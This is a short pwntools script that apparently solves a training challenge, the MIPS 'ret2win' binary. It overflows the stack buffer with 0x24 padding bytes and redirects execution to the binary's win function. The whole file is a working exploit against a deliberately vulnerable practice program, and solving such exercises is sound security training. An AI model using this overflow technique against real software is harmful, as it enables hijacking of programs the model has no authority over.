#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('ret2win_mipsel')

winadr = elf.symbols["ret2win"]

gs='''
b *pwnme+80
c
'''

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


time.sleep(.5)


io.recvuntil(b"> ")

print("ret2win addr : ",hex(winadr))
PL=0x24*b"A"+p32(winadr+8)
io.sendline(PL)
io.interactive()

